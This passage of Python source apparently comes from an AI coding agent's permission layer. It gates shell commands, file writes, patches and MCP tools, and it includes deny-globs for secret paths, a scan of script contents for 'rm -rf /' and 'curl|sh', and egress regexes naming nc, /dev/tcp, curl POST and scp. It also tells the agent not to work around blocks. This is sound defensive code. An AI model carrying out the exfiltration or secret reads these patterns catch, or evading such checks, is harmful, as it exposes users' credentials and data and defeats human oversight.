            except Exception:
                continue
            try:
                resolved = p.resolve(strict=False)
            except Exception:
                resolved = p
            in_root = perms.find_root_for(resolved)
            if in_root is not None:
                try:
                    rel = str(resolved.relative_to(in_root)).replace("\\", "/")
                except Exception:
                    rel = str(resolved).replace("\\", "/")
            else:
                rel = str(resolved).replace("\\", "/")
            if perms.matches_path_deny(rel):
                return tok
        return None

    # Interpreters that run a script file given as an argument. A command like
    # ``python payload.py`` passes the plain bash deny-list (the dangerous part
    # lives in the file, not the command line), so we resolve the referenced
    # script and apply the SAME deny-list + secret-path scan to its contents.
    _SCRIPT_INTERP_RE = re.compile(
        r"^(?:python(?:3(?:\.\d+)?)?|pypy3?|bash|sh|zsh|ksh|"
        r"node|deno|bun|perl|ruby|php|Rscript|lua)$"
    )

    def _referenced_script_paths(self, cmd: str) -> list[str]:
        """Best-effort list of script files a command would execute."""
        import shlex
        out: list[str] = []
        for seg in _split_shell_segments(cmd):
            try:
                toks = shlex.split(seg)
            except Exception:
                continue
            i = 0
            while i < len(toks):
                tok = toks[i]
                base = tok.rsplit("/", 1)[-1]
                if self._SCRIPT_INTERP_RE.match(base):
                    j = i + 1
                    inline = False
                    while j < len(toks):
                        nt = toks[j]
                        if nt in ("-m", "-c", "-e", "-"):  # module / inline → no file
                            inline = True
                            break
                        if nt.startswith("-"):
                            j += 1
                            continue
                        break
                    if not inline and j < len(toks):
                        out.append(toks[j])
                    i = j + 1
                    continue
                # Direct execution: ./script or an absolute path with a basename
                if tok.startswith("./") or (tok.startswith("/") and "." in base):
                    out.append(tok)
                i += 1
        return out

    def _scan_bash_script_payloads(
        self, cmd: str, args: dict, perms: "KitToolPermissions"
    ) -> Optional[str]:
        """Apply the deny-list + secret-path scan to the CONTENTS of any script
        the command runs. Reuses the curated patterns (so legitimate code using
        subprocess/etc. is untouched — only a literal ``rm -rf /`` / ``sudo`` /
        ``curl|sh`` or a ``.ssh``/credentials path reference trips it). The
        obfuscated case (base64-then-exec) is left to filesystem isolation.
        Returns a reason string, or None. Never raises."""
        try:
            cwd_arg = str(args.get("cwd") or "").strip()
            base_dir = Path(cwd_arg) if cwd_arg else Path(perms.workspace)
        except Exception:
            base_dir = Path(perms.workspace)
        for ref in self._referenced_script_paths(cmd):
            try:
                p = Path(ref)
                if not p.is_absolute():
                    p = base_dir / p
                p = p.expanduser()
                if not p.is_file() or p.stat().st_size > 512_000:
                    continue
                text = p.read_text(encoding="utf-8", errors="replace")
            except Exception:
                continue
            hit = perms.matches_bash_deny(text)
            if hit:
                return f"{ref} contains deny-pattern {hit!r}"
            for tok in set(re.findall(
                r"(?<![A-Za-z0-9_])(?:~|\$HOME|/)[^\s;|&<>()`'\"]+", text)):
                try:
                    rp = Path(tok.replace("$HOME", "~")).expanduser().resolve(
                        strict=False)
                except Exception:
                    continue
                root = perms.find_root_for(rp)
                rel = (str(rp.relative_to(root)).replace("\\", "/")
                       if root is not None else str(rp).replace("\\", "/"))
                if perms.matches_path_deny(rel):
                    return f"{ref} references a secret path ({tok!r})"
        return None

    # Outbound data-transfer signatures. These flag EXFILTRATION shapes
    # (uploading data to a remote), NOT ordinary downloads — `curl/wget URL`
    # (a GET, e.g. pip/git) is untouched, so normal workflows are unaffected.
    _EGRESS_PATTERNS = (
        (r"\b(?:curl|wget)\b[^|;&\n]*?\s"
         r"(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form|-T|"
         r"--upload-file|--data\b|-X\s*POST|--request\s+POST|"
         r"--post-file|--post-data|--body-file|--body-data|--method[=\s]*POST)\b",
         "data upload via curl/wget"),
        (r"\b(?:nc|ncat|netcat)\b\s+\S", "raw socket transfer (nc)"),
        (r"/dev/(?:tcp|udp)/", "bash /dev/tcp network redirect"),
        (r"\b(?:scp|rsync)\b[^|;&\n]*\s\S+@\S+:", "copy to a remote host"),
    )

    def _scan_bash_egress(self, cmd: str) -> Optional[str]:
        """Detect an outbound data-transfer (exfiltration) command. Returns a
        short reason, or None. Pure regex over the command; never raises."""
        try:
            for pat, label in self._EGRESS_PATTERNS:
                if re.search(pat, cmd, re.IGNORECASE):
                    return label
        except Exception:
            return None
        return None

    def _check_read_access(
        self, perms: "KitToolPermissions", path: Path, label: str = ""
    ) -> Optional[str]:
        """Gate read-style tools (read_file, grep_file).

        Policy:
          - Secret-deny globs (`.ssh/`, `.env`, `*.key`, ...) ALWAYS reject —
            no confirm-callback can override.
          - Paths inside any allowed workspace root: allow.
          - Paths outside: require explicit user confirmation via
            ``perms.confirm_callback``. Without a callback the read is
            refused so the agent can't silently scan the user's home dir.
        """
        try:
            resolved = path.expanduser().resolve()
        except Exception:
            resolved = path

        # Build the string we test against deny-globs: workspace-relative
        # when possible (so globs like ".env" match), else absolute. READS are
        # allowed in any REACHABLE root (writable + read-only archive/delfin +
        # calc) — so the agent reaches calc/archive without a prompt, while the
        # secret-deny below still hard-blocks .ssh/.env/keys everywhere.
        in_root = perms.find_readable_root_for(resolved)
        if in_root is not None:
            try:
                rel_for_glob = str(resolved.relative_to(in_root)).replace("\\", "/")
            except Exception:
                rel_for_glob = str(resolved).replace("\\", "/")
        else:
            rel_for_glob = str(resolved).replace("\\", "/")

        # Hard secret-deny: secrets are NEVER readable, no confirm option.
        if perms.matches_path_deny(rel_for_glob):
            return (
                f"read denied: '{label or rel_for_glob}' matches a secret "
                "deny-glob (.ssh/, .env, *.key, credentials, *.pem). "
                "These are never readable, regardless of mode or confirm."
            )

        # Inside any allowed root: free read.
        if in_root is not None:
            return None

        # Outside the sandbox: ask the user.
        if perms.confirm_callback is None:
            return (
                f"read denied: '{label or resolved}' is outside the allowed "
                "workspace roots and no confirm callback is configured. "
                "Add the directory via 'Erlaubte Verzeichnisse' or "
                "remember_permission(kind='extra_dir', ...) to read it."
            )
        preview = (
            "[OUTSIDE-WORKSPACE READ]\n"
            f"The agent wants to read a file outside the allowed roots:\n"
            f"  {resolved}\n\n"
            "Approving this read does NOT add the directory to the "
            "permanent workspace list — it only allows this single read."
        )
        try:
            ok = bool(perms.confirm_callback(
                "read_file", {"path": str(resolved)}, preview
            ))
        except Exception as exc:
            return f"confirm_callback raised: {exc}"
        if not ok:
            return f"read denied: user declined read of '{resolved}'"
        return None

    def _gate_write_path(
        self, path_arg: str, perms: "KitToolPermissions",
        name: str, args: dict,
    ) -> Optional[str]:
        """Per-path write policy: sandbox+deny (resolve), read-only-archive
        hard-deny, and self-mod-guard / calc explicit-confirm. Shared by
        write_file/edit_file/multi_edit and by every file an apply_patch diff
        touches. Returns an error string to block, or None to allow."""
        # for_read=True: recognise every reachable root so the per-tier policy
        # below can fire (deny read-only, confirm calc). The write EXECUTOR
        # re-resolves writable-only — defense in depth.
        resolved, err = self._resolve_in_workspace(path_arg, perms, for_read=True)
        if err:
            return err
        # READ-ONLY data — archive of stored calculations, or the DELFIN
        # checkout when you didn't launch there. Writes are HARD-denied; copy
        # into calc/agent_workspace and edit the copy ("archive sind fix …
        # wenn man arbeiten will muss man in calc bringen").
        if perms.is_read_only_path(resolved):
            _record_security_event(
                "read_only_write", name, self._display_path(resolved, perms),
                blocked=True)
            return (
                f"'{path_arg}' is in a READ-ONLY location (the archive of "
                f"stored calculations, or the DELFIN checkout). It is fixed "
                f"— to work on it, COPY it into calc or agent_workspace and "
                f"edit the copy. Refusing to modify it in place."
            )
        try:
            rel_str = str(resolved.relative_to(perms.workspace)).replace("\\", "/")
        except Exception:
            rel_str = path_arg.replace("\\", "/")
        is_protected = perms.matches_path_protected(rel_str)
        # calc holds the user's ACTIVE calculations — editing one always needs
        # an explicit confirm even in acceptEdits, so the agent can't silently
        # destroy results ("nur Bearbeitung mit Nachfrage").
        is_calc = perms.is_confirm_write_path(resolved)
        if is_protected or is_calc:
            _record_security_event(
                "self_mod" if is_protected else "calc_edit", name, rel_str,
                blocked=perms.confirm_callback is None)
            if perms.confirm_callback is None:
                _what = ("the agent's own safety layer" if is_protected
                         else "a stored calculation under calc")
                return (
                    f"'{name}' targets {_what} ('{rel_str}') — this requires "
                    "explicit user confirmation but no confirm_callback is "
                    "configured, so it is refused."
                )
            if is_protected:
                preview = (
                    "[SELF-MODIFICATION GUARD]\n"
                    "This file is part of the agent's own safety layer.\n"
                    "Approving this will let the agent rewrite the code that "
                    "controls its own permissions.\n\n"
                    + self._build_change_preview(name, args, resolved)
                )
            else:
                preview = (
                    "[CALC EDIT — STORED CALCULATION]\n"
                    "This file is under calc (an active/stored calculation). "
                    "Approving this lets the agent modify it.\n\n"
                    + self._build_change_preview(name, args, resolved)
                )
            try:
                ok = bool(perms.confirm_callback(name, args, preview))
            except Exception as exc:
                return f"confirm_callback raised: {exc}"
            _w = "protected path" if is_protected else "calc file"
            return None if ok else f"user denied '{name}' on {_w} '{rel_str}'"
        # Writable roots (workspace + agent_workspace + grants): allow.
        return None

    def _run_permission_gate(
        self, name: str, args: dict, perms: "KitToolPermissions"
    ) -> Optional[str]:
        """Run the policy + callback gate. Returns error string or None."""
        mode = perms.mode

        if mode == "plan":
            return (
                f"plan mode (read-only) — '{name}' rejected. "
                "Describe the proposed change in chat instead. "
                "When the plan is complete, call exit_plan_mode to "
                "submit it for approval; the user can also click "
                "'Plan akzeptieren & ausführen' or switch the mode "
                "chip to 'acceptEdits' to proceed."
            )

        if name in ("write_file", "edit_file", "multi_edit"):
            # Tolerate the `file_path` / `filename` / … aliases here too — the
            # permission gate runs BEFORE the executor, so reading only `path`
            # rejected a model that used `file_path` (a common tool-arg convention)
            # with "path is required", even though the executor itself accepts
            # it (bug 2026-06-25: qwen on KIT fell back to bash heredoc writes).
            # The per-path tiers live in _gate_write_path so apply_patch below
            # can gate every file its diff touches with the identical policy.
            return self._gate_write_path(
                self._get_path_arg(args), perms, name, args)

        if name == "apply_patch":
            # A real apply mutates every file the diff touches, so gate each
            # one with the same tiers as a direct write (deny-list, read-only
            # archive, self-mod guard, calc-confirm). Historically apply_patch
            # only ran the self-mod guard, so a diff could create .git/hooks/*,
            # .env, keys or credentials, or silently overwrite a stored calc —
            # everything write_file hard-denies. check_only is `git apply
            # --check` (read-only) → allowed; a real apply in plan mode is
            # already refused by the mode=="plan" guard above.
            if bool(args.get("check_only", False)):
                return None
            diff = args.get("diff", "") or ""
            try:
                from . import patch_apply as _pa
                files = _pa._files_in_diff(diff)
            except Exception:
                files = []
            for rel in files:
                err = self._gate_write_path(rel, perms, "apply_patch", args)
                if err is not None:
                    return err
            return None

        if name == "bash":
            cmd = args.get("command", "") or ""
            if not cmd.strip():
                return "command is required"
            denied = perms.matches_bash_deny(cmd)
            if denied:
                _record_security_event("deny_pattern", "bash",
                                       f"{cmd[:80]} → {denied}")
                return f"command rejected by deny-pattern {denied!r}: refusing to run."
            secret_hit = self._scan_bash_for_secrets(cmd, perms)
            if secret_hit is not None:
                _record_security_event("secret_path", "bash", str(secret_hit))
                return (
                    f"bash command references a secret-deny path ({secret_hit!r}). "
                    "Reading or touching .ssh/.env/*.key/credentials via the "
                    "shell is blocked — the read deny-list applies to bash too."
                )
            payload_hit = self._scan_bash_script_payloads(cmd, args, perms)
            if payload_hit is not None:
                _record_security_event("script_payload", "bash", str(payload_hit))
                return (
                    f"bash refuses to run a script whose contents trip the "
                    f"safety scan: {payload_hit}. The deny-list + secret scan "
                    "apply to executed script files too, not just the command "
                    "line."
                )
            # Outbound data-transfer (exfiltration) detection. Always surfaced
            # in the containment panel; hard-blocked in the unattended mode and
            # routed through the normal user approval otherwise (so an
            # interactive user stays in control — ordinary downloads, GET
            # curl/git/pip, are never flagged).
            egress = self._scan_bash_egress(cmd)
            if egress is not None:
                _record_security_event(
                    "egress", "bash", f"{egress}: {cmd[:80]}",
                    blocked=(mode == "bypassPermissions"))
                if mode == "bypassPermissions":
                    return (
                        f"outbound data-transfer blocked in unattended mode "
                        f"({egress}). Sending data to a remote host is not "
                        "allowed without a human in the loop."
                    )
            if mode == "bypassPermissions":
                # Bypass: only the deny-list still applies; everything else
                # runs unattended. Use this only inside trusted workflows.
                return None
            if perms.matches_bash_auto_allow(cmd):
                return None
            # Not auto-allowed. In "Ask All" (default) mode, when a per-action
            # approval dialog is wired (the dashboard KitConfirmBroker), ask the
            # user to approve THIS command — one click — instead of dead-ending
            # into a prose block that makes the agent ask in prose whether it
            # may ask (bug 20260616-183359). The deny-list + secret scan already
            # ran above, so only non-dangerous, non-auto-allowed commands reach
            # the prompt. Head-less callers (no callback) keep the prose block.
            if mode == "default" and perms.confirm_callback is not None:
                _cwd = str(args.get("cwd") or "").strip()
                preview = f"$ {cmd}" + (f"\n(cwd: {_cwd})" if _cwd else "")
                try:
                    ok = bool(perms.confirm_callback("bash", {"command": cmd}, preview))
                except Exception as exc:
                    return f"confirm_callback raised: {exc}"
                if ok:
                    return None
                _record_security_event("denied_by_user", "bash", cmd[:80])
                return (
                    f"user denied the bash command '{cmd[:120]}'. Do NOT retry "
                    "it or work around it — ask the user what to do instead."
                )
            # default / acceptEdits without a UI callback (head-less / CLI):
            # the command must match an auto-allow regex; otherwise tell the
            # user the exact command and let them add an allow_pattern or switch
            # the mode chip.
            hint = ""
            if cmd.lstrip().startswith(("cd ", "cd\t")):
                hint = (
                    " HINT: this command starts with 'cd' — use the bash "
                    "tool's `cwd` parameter (it accepts absolute paths "
                    "inside allowed roots) instead of 'cd /path && …'. "
                    "Rerun with cwd=<path> and the actual command."
                )
            return (
                f"bash: '{cmd[:120]}' is not on the auto-allow list "
                f"(mode={mode}). Do NOT try to work around this block with "
                "alternative commands — that wastes turns and erodes trust. "
                "Instead TELL THE USER the exact command and WHY you need it, "
                "and ask them to either approve it (remember_permission("
                "kind='allow_pattern', value='^\\\\s*<cmd>\\\\b')) or switch "
                "the Perms/KIT mode. Then STOP and wait." + hint
            )

        return None

    def _gate_mcp_tool(
        self, name: str, args: dict, perms: Optional["KitToolPermissions"]
    ) -> Optional[str]:
        """Apply the native permission gate to side-effecting MCP tools.

        MCP tools (``mcp__<server>__<tool>``) are dispatched straight to the
        remote server, bypassing ``_run_permission_gate``. Two families let a
        model reach past the sandbox that way:

        * shells (``mcp__kit-coding__bash`` …) — arbitrary commands (``git
          push``, ``rm -rf``, secret reads, data exfiltration) with none of
          the native ``bash`` checks; remapped onto the bash gate.
        * file mutators (``mcp__kit-coding__write_file`` / ``edit_file`` /
          ``multi_edit`` / ``notebook_edit``) — writes outside the sandbox,
          into the read-only archive, the agent's own safety layer, or a
          stored calc; remapped onto the matching write gate.

        Returns an error string to BLOCK the call, or None to allow it. Every
        other (read-only / neutral) MCP tool returns None immediately, so its
        existing behaviour is untouched.
        """
        if not isinstance(name, str) or not name.startswith("mcp__"):
            return None
        base = name.rsplit("__", 1)[-1]

        # (0) Per-role execution allow-list. MCP tools are dispatched without
        # passing through ``execute()``'s deny-by-default role check, so a
        # restricted role (e.g. dashboard_agent) could otherwise reach
        # read_file / bash / write_file via an MCP backend. Re-check here so
        # the allow-list holds regardless of the dispatch path — same intent
        # as the checkpoint in ``execute``. Roles without an allow-list are
        # never denied (returns False), so the solo agent is unaffected.
        if perms is not None:
            role = getattr(perms, "agent_role", "") or ""
            if _tool_denied_for_role(role, name):
                _record_security_event("role_denied_mcp", name, role,
                                       blocked=True)
                return (
                    f"Tool '{name}' is not available to the '{role}' role — "
                    "its execution allow-list does not include this tool, "
                    "including via an MCP backend."
                )

        # (1) Shell executors → the bash gate (command payload remapped).
        if base in _MCP_BASH_TOOL_BASES:
            cmd = ""
            if isinstance(args, dict):
                for key in _MCP_BASH_CMD_KEYS:
                    val = args.get(key)
                    if isinstance(val, str) and val.strip():
                        cmd = val
                        break
            # A shell tool we can't read the command from — leave dispatch to
            # the server rather than mis-gating an unknown payload.
            if not cmd:
                return None
            if perms is None:
                _record_security_event("mcp_bash_no_perms", name, cmd[:80],
                                       blocked=True)
                return (
                    f"'{name}' executes shell commands but no permissions are "
                    "configured, so it is refused."
                )
            # Reuse the bash gate verbatim: same deny-list, secret/egress
            # scan, auto-allow, and confirm/head-less block as native bash.
            return self._run_permission_gate(
                "bash", {**args, "command": cmd}, perms)

        # (2) File mutators → the matching write gate (path-based). The MCP
        # arg shape matches the native tool, so args pass through unchanged.
        gate_name = _MCP_WRITE_GATE_MAP.get(base)
        if gate_name is not None:
            if perms is None:
                _record_security_event("mcp_write_no_perms", name, "",
                                       blocked=True)
                return (
                    f"'{name}' mutates files but no permissions are "
                    "configured, so it is refused."
                )
            return self._run_permission_gate(gate_name, args, perms)

        return None

    def _build_change_preview(
        self, name: str, args: dict, resolved_path: Optional[Path]
    ) -> str:
        try:
            if resolved_path is None or not resolved_path.exists():
                old_text = ""
            else:
                old_text = resolved_path.read_text(encoding="utf-8", errors="replace")
        except Exception:
            old_text = ""
        if name == "write_file":
            new_text = args.get("content", "") or ""
        elif name == "edit_file":
            old_s = args.get("old_string", "")
            new_s = args.get("new_string", "")
            if args.get("replace_all"):
                new_text = old_text.replace(old_s, new_s)
            else:
                new_text = old_text.replace(old_s, new_s, 1)
        elif name == "multi_edit":
            new_text = old_text
            for ed in args.get("edits", []) or []:
                o = ed.get("old_string", "")
                n = ed.get("new_string", "")
                if not o or o == n:
                    continue
                if ed.get("replace_all"):
                    new_text = new_text.replace(o, n)
                else:
                    new_text = new_text.replace(o, n, 1)
        elif name == "apply_patch":
            # The patch itself IS the change preview — show it verbatim rather
            # than a synthetic old→new content diff (the new content isn't in
            # args; it's encoded in the unified diff).
            _d = str(args.get("diff", "") or "").splitlines()
            body = "\n".join(_d[:200])
            if len(_d) > 200:
                body += f"\n... ({len(_d) - 200} more diff lines truncated)"
            return body or "(empty diff)"
        else:
            return ""
        return self._make_diff(old_text, new_text, str(resolved_path or args.get("path", "")))

    @staticmethod
    def _make_diff(old: str, new: str, label: str, max_lines: int = 200) -> str:
        diff = list(difflib.unified_diff(
            old.splitlines(keepends=False),
            new.splitlines(keepends=False),
            fromfile=f"a/{label}",
            tofile=f"b/{label}",
            lineterm="",
            n=3,
        ))
        if not diff:
            return "(no changes)"
        if len(diff) > max_lines:
            diff = diff[:max_lines] + [f"... ({len(diff) - max_lines} more diff lines truncated)"]
        return "\n".join(diff)

    def _execute_write_file(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        path_arg = self._get_path_arg(arguments)
        content = arguments.get("content", "")
        if content is None:
            return json.dumps({"error": "content is required"})
        resolved, err = self._resolve_in_workspace(path_arg, perms)
        if err:
            return json.dumps({"error": err})

        existed = resolved.exists()
        if existed:
            tracked = perms.read_tracker.get(str(resolved))
            try:
                current_mtime = resolved.stat().st_mtime
            except Exception:
                current_mtime = None
            if tracked is None:
                return json.dumps({"error": (
                    f"refusing to overwrite existing file '{path_arg}' without "
                    "a prior read_file in this session — call read_file first."
                )})
            if current_mtime is not None and current_mtime > tracked + 1e-3:
                return json.dumps({"error": (
                    f"file '{path_arg}' was modified since last read_file "
                    "(mtime mismatch). Re-read before writing."
                )})
            try:
                old_text = resolved.read_text(encoding="utf-8", errors="replace")
            except Exception as exc:
                return json.dumps({"error": f"cannot read existing file: {exc}"})
        else:
            old_text = ""

        try:
            resolved.parent.mkdir(parents=True, exist_ok=True)
            resolved.write_text(content, encoding="utf-8")
        except Exception as exc:
            return json.dumps({"error": f"write failed: {exc}"})

        try:
            perms.read_tracker[str(resolved)] = resolved.stat().st_mtime
        except Exception:
            pass

        disp = self._display_path(resolved, perms)
        diff = self._make_diff(old_text, content, disp)
        action = "created" if not existed else "overwritten"
        test_hint = self._suggest_test_for_edit(resolved, perms)
        return f"File {action}: {disp}\n\n{diff}{test_hint}"

    def _execute_edit_file(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        path_arg = self._get_path_arg(arguments)
        old_string = arguments.get("old_string", "")
        new_string = arguments.get("new_string", "")
        replace_all = bool(arguments.get("replace_all", False))
        if old_string == new_string:
            return json.dumps({"error": "new_string must differ from old_string"})
        if not old_string:
            return json.dumps({"error": "old_string is required"})

        resolved, err = self._resolve_in_workspace(path_arg, perms)
        if err:
            return json.dumps({"error": err})
        if not resolved.exists():
            return json.dumps({"error": f"file not found: {path_arg}"})
        if not resolved.is_file():
            return json.dumps({"error": f"not a regular file: {path_arg}"})

        tracked = perms.read_tracker.get(str(resolved))
        try:
            current_mtime = resolved.stat().st_mtime
        except Exception:
            current_mtime = None
        if tracked is None:
            return json.dumps({"error": (
                f"call read_file on '{path_arg}' before editing — "
                "edits require an established read baseline."
            )})
        if current_mtime is not None and current_mtime > tracked + 1e-3:
            return json.dumps({"error": (
                f"file '{path_arg}' was modified since last read_file. Re-read first."
            )})

        try:
            old_text = resolved.read_text(encoding="utf-8", errors="replace")
        except Exception as exc:
            return json.dumps({"error": f"cannot read file: {exc}"})

        count = old_text.count(old_string)
        fuzzy_note = ""
        if count == 0:
            # Exact match failed. Try Aider-style fuzzy match as fallback —
            # but only when not in replace_all mode (fuzzy + replace_all is
            # too dangerous).
            if not replace_all:
                from . import editblock as _editblock
                fm = _editblock.fuzzy_replace(old_text, old_string, new_string)
                if fm is not None:
                    new_text = fm.new_text
                    try:
                        resolved.write_text(new_text, encoding="utf-8")
                    except Exception as exc:
                        return json.dumps({"error": f"write failed: {exc}"})
                    try:
                        perms.read_tracker[str(resolved)] = resolved.stat().st_mtime
                    except Exception:
                        pass
                    disp = self._display_path(resolved, perms)
                    diff = self._make_diff(old_text, new_text, disp)
                    indent_note = (
                        f", indent {fm.indent_shift}" if fm.indent_shift else ""
                    )
                    return (
                        f"Edited {disp} (1 replacement, fuzzy match: "
                        f"{fm.strategy}{indent_note} — old_string did not "
                        f"match exactly; whitespace-tolerant fallback found "
                        f"a unique match):\n\n{diff}"
                    )
            return json.dumps({"error": (
                f"old_string not found in '{path_arg}' "
                "(neither exact nor whitespace-tolerant match). "
                "Re-read the file and copy the target block verbatim."
            )})
        if count > 1 and not replace_all:
            return json.dumps({"error": (
                f"old_string matches {count} times in '{path_arg}'. "
                "Provide more surrounding context to make it unique, or pass replace_all=true."
            )})

        new_text = (
            old_text.replace(old_string, new_string)
            if replace_all
            else old_text.replace(old_string, new_string, 1)
        )

        try:
            resolved.write_text(new_text, encoding="utf-8")
        except Exception as exc:
            return json.dumps({"error": f"write failed: {exc}"})

        try:
            perms.read_tracker[str(resolved)] = resolved.stat().st_mtime
        except Exception:
            pass

        disp = self._display_path(resolved, perms)
        diff = self._make_diff(old_text, new_text, disp)
        replaced = count if replace_all else 1
        test_hint = self._suggest_test_for_edit(resolved, perms)
        return (
            f"Edited {disp} ({replaced} replacement(s)){fuzzy_note}:\n\n"
            f"{diff}{test_hint}"
        )

    def _execute_multi_edit(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        path_arg = self._get_path_arg(arguments)
        edits = arguments.get("edits", []) or []
        if not isinstance(edits, list) or not edits:
            return json.dumps({"error": "edits must be a non-empty list"})

        resolved, err = self._resolve_in_workspace(path_arg, perms)
        if err:
            return json.dumps({"error": err})
        if not resolved.exists():
            return json.dumps({"error": f"file not found: {path_arg}"})
        if not resolved.is_file():
            return json.dumps({"error": f"not a regular file: {path_arg}"})

        tracked = perms.read_tracker.get(str(resolved))
        try:
            current_mtime = resolved.stat().st_mtime
        except Exception:
            current_mtime = None
        if tracked is None:
            return json.dumps({"error": (
                f"call read_file on '{path_arg}' before editing — "
                "edits require an established read baseline."
            )})
        if current_mtime is not None and current_mtime > tracked + 1e-3:
            return json.dumps({"error": (
                f"file '{path_arg}' was modified since last read_file. Re-read first."
            )})

        try:
            old_text = resolved.read_text(encoding="utf-8", errors="replace")
        except Exception as exc:
            return json.dumps({"error": f"cannot read file: {exc}"})

        text = old_text
        per_edit_replacements: list[int] = []
        fuzzy_edits: list[int] = []
        for i, ed in enumerate(edits):
            if not isinstance(ed, dict):
                return json.dumps({"error": f"edit #{i+1} is not an object"})
            o = ed.get("old_string", "")
            n = ed.get("new_string", "")
            replace_all = bool(ed.get("replace_all", False))
            if not o:
                return json.dumps({"error": f"edit #{i+1}: old_string is required"})
            if o == n:
                return json.dumps({"error": f"edit #{i+1}: new_string must differ from old_string"})
            count = text.count(o)
            if count == 0:
                # Try fuzzy fallback (only when not replace_all; ambiguous
                # then). If still no unique match, fail the whole batch.
                if not replace_all:
                    from . import editblock as _editblock
                    fm = _editblock.fuzzy_replace(text, o, n)
                    if fm is not None:
                        text = fm.new_text
                        per_edit_replacements.append(1)
                        fuzzy_edits.append(i + 1)
                        continue
                return json.dumps({"error": (
                    f"edit #{i+1}: old_string not found "
                    f"(neither exact nor whitespace-tolerant match, "
                    f"after applying earlier edits in this batch)"
                )})
            if count > 1 and not replace_all:
                return json.dumps({"error": (
                    f"edit #{i+1}: old_string matches {count} times. "
                    "Add context to make it unique, or set replace_all=true."
                )})
            text = text.replace(o, n) if replace_all else text.replace(o, n, 1)
            per_edit_replacements.append(count if replace_all else 1)

        try:
            resolved.write_text(text, encoding="utf-8")
        except Exception as exc:
            return json.dumps({"error": f"write failed: {exc}"})

        try:
            perms.read_tracker[str(resolved)] = resolved.stat().st_mtime
        except Exception:
            pass

        disp = self._display_path(resolved, perms)
        diff = self._make_diff(old_text, text, disp)
        total = sum(per_edit_replacements)
        fuzzy_note = (
            f", fuzzy fallback used for edit(s) {fuzzy_edits}"
            if fuzzy_edits else ""
        )
        test_hint = self._suggest_test_for_edit(resolved, perms)
        return (
            f"Multi-edited {disp} "
            f"({len(edits)} edit(s), {total} replacement(s) total"
            f"{fuzzy_note}):\n\n{diff}{test_hint}"
        )

    def _suggest_test_for_edit(
        self, resolved: Path, perms: "KitToolPermissions"
    ) -> str:
        """Return a one-line hint pointing the agent at the matching test
        module after a successful edit, or '' if there's no obvious match.

        This is the lightweight half of the auto-test loop: instead of
        spawning pytest unconditionally (which would burn cycles on every
        no-op edit), we surface the test file's path so the agent's next
        bash call naturally lands on the right verification command.
        Conventions covered:

            edited        →  test candidate
            ----------------+------------------------
            foo/bar.py    →  tests/test_bar.py
                             tests/foo/test_bar.py
                             foo/tests/test_bar.py
                             test_bar.py (next to source)

        Skipped when: file isn't .py, or no tests directory exists
        anywhere in the workspace tree.
        """
        if resolved.suffix != ".py":
            return ""
        if resolved.name.startswith("test_") or resolved.name.endswith("_test.py"):
            # Editing a test file itself — the agent should run THIS file.
            try:
                root = perms.find_root_for(resolved)
                rel = resolved.relative_to(root) if root else resolved
            except Exception:
                rel = resolved
            return f"\n\nTip: this is a test file — verify via `pytest {rel} -q`."
        try:
            root = perms.find_root_for(resolved)
        except Exception:
            root = None
        if root is None:
            return ""
        stem = resolved.stem
        # Subpath of the edited file relative to its workspace root, used
        # to locate sibling tests/ dirs and mirrored test trees.
        try:
            rel = resolved.relative_to(root)
        except Exception:
            return ""
        candidates = [
            root / "tests" / f"test_{stem}.py",
            root / "tests" / f"{stem}_test.py",
            root / "test" / f"test_{stem}.py",
            resolved.parent / f"test_{stem}.py",
            resolved.parent / "tests" / f"test_{stem}.py",
        ]
        # Mirror the source layout under tests/, e.g.
        # delfin/agent/api_client.py → tests/agent/test_api_client.py.
        if len(rel.parts) > 1:
            mirror = root / "tests" / rel.parent / f"test_{stem}.py"
            candidates.insert(2, mirror)

        for cand in candidates:
            try:
                if cand.is_file():
                    cand_rel = cand.relative_to(root)
                    return (
                        f"\n\nTip: matching test file is `{cand_rel}` — "
                        f"verify via `pytest {cand_rel} -q --timeout=30` "
                        "before reporting success."
                    )
            except Exception:
                continue
        return ""

    def _execute_remember_permission(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        """Persist a KIT permission rule to ~/.delfin/settings.json.

        Always routes through ``perms.confirm_callback`` so the user gets a
        chance to deny — even in 'acceptEdits'/'bypassPermissions' modes.
        Updates ``perms`` in-place so the rule takes effect immediately.
        """
        kind = (arguments.get("kind", "") or "").strip()
        value = (arguments.get("value", "") or "").strip()
        scope = (arguments.get("scope", "user") or "user").strip().lower()
        rationale = (arguments.get("rationale", "") or "").strip()

        if kind not in {"allow_pattern", "deny_pattern",
                        "extra_dir", "default_mode"}:
            return json.dumps({"error": f"unknown kind: {kind!r}"})
        if not value:
            return json.dumps({"error": "value must be non-empty"})
        if scope not in {"user", "repo"}:
            return json.dumps({"error": f"scope must be 'user' or 'repo', got {scope!r}"})

        # Build a human-readable preview for the confirm dialog.
        try:
            from . import kit_settings as _kit_settings
        except Exception as exc:
            return json.dumps({"error": f"kit_settings import failed: {exc}"})

        scope_path = (
            str(_kit_settings.repo_settings_path(perms.workspace))
            if scope == "repo" else str(_kit_settings.USER_SETTINGS_PATH)
        )
        preview = (
            f"remember_permission\n"
            f"  kind:      {kind}\n"
            f"  value:     {value}\n"
            f"  scope:     {scope}  ->  {scope_path}\n"
            f"  rationale: {rationale or '(none)'}\n"
            f"\nThis writes the rule to the JSON file. Future sessions will load it on startup."
        )

        # Always require user confirmation regardless of mode.
        if perms.confirm_callback is None:
            return json.dumps({"error": (
                "remember_permission needs a user-confirm callback. "
                "Run inside the dashboard with the KIT confirm panel mounted."
            )})
        try:
            ok = bool(perms.confirm_callback(
                "remember_permission",
                {"kind": kind, "value": value, "scope": scope,
                 "rationale": rationale},
                preview,
            ))
        except Exception as exc:
            return json.dumps({"error": f"confirm_callback raised: {exc}"})
        if not ok:
            return json.dumps({"status": "denied", "kind": kind, "value": value})

        # Apply the change to disk and to the live permissions.
        try:
            if kind == "allow_pattern":
                _kit_settings.persist_pattern(
                    value, kind="allow", scope=scope, repo_dir=perms.workspace
                )
                if value not in perms.bash_auto_allow_patterns:
                    perms.bash_auto_allow_patterns = (
                        perms.bash_auto_allow_patterns + (value,)
                    )
            elif kind == "deny_pattern":
                _kit_settings.persist_pattern(
                    value, kind="deny", scope=scope, repo_dir=perms.workspace
                )
                if value not in perms.bash_deny_patterns:
                    perms.bash_deny_patterns = (
